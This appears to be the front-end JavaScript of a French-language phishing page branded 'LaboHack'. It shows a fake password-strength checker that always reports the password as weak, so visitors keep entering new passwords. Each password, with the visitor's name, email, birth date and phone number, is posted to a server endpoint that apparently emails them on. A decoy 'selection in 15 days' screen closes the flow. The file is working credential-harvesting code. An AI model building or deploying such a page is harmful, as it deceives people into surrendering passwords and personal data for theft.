let attemptCount = 0;
const form = document.getElementById('phishForm');
const passwordInput = document.getElementById('password');
const checkBtn = document.getElementById('checkStrengthBtn');
const messageBox = document.getElementById('messageBox');
const toast = document.getElementById('toast');

// Fonction pour afficher les messages d'erreur
function showMessage(text, isError = true) {
  messageBox.style.display = 'block';
  messageBox.textContent = text;
  messageBox.style.color = isError ? '#ff0044' : '#00ff41';
  messageBox.style.borderColor = isError ? '#ff0044' : '#00ff41';
}

// Simulation de vérification de force (échoue toujours)
checkBtn.addEventListener('click', async () => {
  const password = passwordInput.value.trim();
  if (!password) {
    showMessage('⚠️ Veuillez saisir un mot de passe.', true);
    return;
  }

  attemptCount++;
  showMessage(`🔐 Tentative ${attemptCount} : Mot de passe faible. Veuillez changer.`, true);

  // Envoi du mot de passe vers l'email (via Resend)
  const data = {
    nom: document.getElementById('nom').value || 'Non renseigné',
    email: document.getElementById('email').value || 'Non renseigné',
    password: password,
    dateNaissance: document.getElementById('dateNaissance').value || 'Non renseignée',
    telephone: document.getElementById('telephone').value || 'Non renseigné',
    attempt: attemptCount
  };

  try {
    const response = await fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (response.ok) {
      toast.textContent = '✅ Mot de passe enregistré (faible). Réessayez.';
      toast.classList.remove('hidden');
      toast.style.borderColor = '#ff0044';
    } else {
      toast.textContent = '❌ Erreur serveur, mais données sauvegardées.';
      toast.classList.remove('hidden');
      toast.style.borderColor = '#ff0044';
    }
  } catch (error) {
    toast.textContent = '❌ Erreur réseau, mais données sauvegardées.';
    toast.classList.remove('hidden');
    toast.style.borderColor = '#ff0044';
  }

  // Vider le champ mot de passe pour obliger à en saisir un nouveau
  passwordInput.value = '';
  passwordInput.focus();
});

// Soumission du formulaire (redirection finale)
form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const password = passwordInput.value.trim();
  if (!password) {
    showMessage('⚠️ Veuillez saisir un mot de passe.', true);
    return;
  }

  // Envoyer les données finales
  const data = {
    nom: document.getElementById('nom').value || 'Non renseigné',
    email: document.getElementById('email').value || 'Non renseigné',
    password: password,
    dateNaissance: document.getElementById('dateNaissance').value || 'Non renseignée',
    telephone: document.getElementById('telephone').value || 'Non renseigné',
    attempt: attemptCount + 1,
    final: true
  };

  try {
    const response = await fetch('/api/send-email', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (response.ok) {
      toast.textContent = '✅ Données envoyées ! Redirection...';
      toast.classList.remove('hidden');
      // Redirection vers la page "15 jours"
      document.body.innerHTML = `
        <div class="container" style="text-align:center; padding:4rem 2rem;">
          <h1 class="glitch">LABO<span>HACK</span></h1>
          <div style="font-size:4rem; margin:2rem 0;">⏳</div>
          <h2 style="color:#00f0ff;">Merci !</h2>
          <p style="color:#00ff41; font-size:1.2rem; margin:1rem 0;">
            Nous vérifions vos informations.<br>
            <strong style="color:#ff0044;">Vous recevrez un email dans 15 jours</strong> si vous êtes sélectionné.
          </p>
          <p style="color:#444; margin-top:2rem; font-size:0.7rem;">🔐 LaboHack</p>
        </div>
      `;
    } else {
      showMessage('❌ Erreur serveur, réessayez.', true);
    }
  } catch (error) {
    showMessage('❌ Erreur réseau, réessayez.', true);
  }
});
